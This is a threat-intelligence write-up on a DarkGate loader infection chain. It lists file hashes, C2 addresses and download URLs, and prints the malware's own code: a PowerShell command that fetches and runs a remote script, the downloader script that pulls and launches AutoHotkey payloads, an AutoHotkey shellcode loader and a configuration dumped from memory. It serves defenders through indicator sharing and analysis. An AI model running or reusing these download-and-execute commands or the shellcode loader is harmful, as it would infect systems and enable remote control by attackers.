THREAT IDENTIFICATION: DARKGATE LOADER

INFECTION FLOW
xlsx -> vbs file -> powershell scripts -> AutoHotKey download and launch -> injection -> dll -> C2

XLSX FILE HASHES
statapril2024-3938.xlsx
4a56755df3a6ed7ae91c32d901a5d953
SHA1: 7de195d519087054eca92540e209732cba0a2eb6

XLSX FILE METADATA
Author: dkcmsw
Last Modified By: admin

VBS FILE DOWNLOAD URL
\\45.89.53.187\s\MS_EXCEL_AZURE_CLOUD_OPEN_DOCUMENT.vbs

VBS FILE HASHES
MS_EXCEL_AZURE_CLOUD_OPEN_DOCUMENT.vbs
e0217823f2f748254b43ede64e422199
SHA1: 3bede6ac6d6e7362b64a7de6663c9b6caac29832

INTERCEPTED POWERSHELL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (Invoke-RestMethod -Uri '103.124.106.237/wctaehcw')

POWERSHELL SCRIPT FILE DOWNLOAD URL
http://103.124.106.237/wctaehcw

POWERSHELL SCRIPT FILE HASH
wctaehcw
c89dae822797a6e047fd7ac572a90fb6
SHA1: c6638c14c23ac9d9a1ef96124dec9b9dfefa53fe

POWERSHELL SCRIPT FILE CONTENTS
ni 'C:/kady/' -Type Directory -Force;cd 'C:/kady/';Invoke-WebRequest -Uri "http://103.124.106.237/gsgqmjivmr" -OutFile 'C:/kady/temp_AutoHotkey.exe';[System.IO.File]::WriteAllBytes("C:/kady/AutoHotkey.exe",([System.IO.File]::ReadAllBytes("C:/kady/temp_AutoHotkey.exe")[1024..([System.IO.File]::ReadAllBytes("C:/kady/temp_AutoHotkey.exe").Length-1)]));Invoke-WebRequest -Uri "http://103.124.106.237/rjlcmdey" -OutFile 'C:/kady/script.ahk';Invoke-WebRequest -Uri "http://103.124.106.237/giibkqxo" -OutFile 'C:/kady/test.txt'; start 'C:/kady/AutoHotkey.exe' -a 'C:/kady/script.ahk';attrib +h 'C:/kady/'

AUTOHOTKEY SCRIPT COMPONENTS DOWNLOAD URLS
http://103.124.106.237/gsgqmjivmr
(temp_AutoHotkey.exe - later renamed "AutoHotkey.exe" and saved minus 1 byte)

http://103.124.106.237/rjlcmdey
(script.ahk)

http://103.124.106.237/giibkqxo
(test.txt)

AUTOHOTKEY SCRIPT FILE HASH
script.ahk
958cd4a849145b96e92e63ef4e152349
SHA1: 19d79b480294e7c329c19faf87fc5e3320268caa

AUTOHOTKEY SCRIPT CONTENTS
#NoTrayIcon
xoaglqdg := 0x1000
owggqvqz := 0x2000
cwhusxbr := 0x40
kbtjwddp := A_ScriptDir . "\test.txt"
FileRead, ihzedkhw, %kbtjwddp%
size := 472194
irmplvgp := DllCall("VirtualAlloc", "Ptr", 0, "UInt", size, "UInt", xoaglqdg | owggqvqz, "UInt", cwhusxbr)
Loop, % size {
lrsuzvyu := "0x" . SubStr(ihzedkhw, 2 * A_Index - 1, 2)
NumPut(lrsuzvyu, irmplvgp + (A_Index - 1), "Char")
}
DllCall(irmplvgp)

ENCODED PAYLOAD DATA FILE HASH
giibkqxo
8ed12b37b69693e66f928cd39fc21c6c
SHA1: 2ee8c14330d38f3ba3c23e4bb56c05b29191ff03
(test.txt)

DARKGATE C2s
http://103.124.106.237/

DARKGATE CONFIGURATION - DUMPED FROM MEMORY
0x32a11f0 (1071): DOMAINS=103.124.106.237|
EPOCH=1712677038
0=103.124.106.237|
8=No
11=DarkGate
12=R0ijS0qCVITtS0e6xeZ
13=6
14=Yes
15=80
1=Yes
32=No
3=Yes
4=No
18=50
6=Yes
7=No
19=4000
5=No
21=No
22=No
23=No
31=Yes
24=edr2
25=admin888
26=No
27=bedxvHpr
28=No
29=2
tabla=4V7z,jJfq) [E$mdY3]2}uUwygI&GLX6tpObsPT{=nS8vHBRhxQrc(MCZ*aDi.l90N"eA5KkFoW1

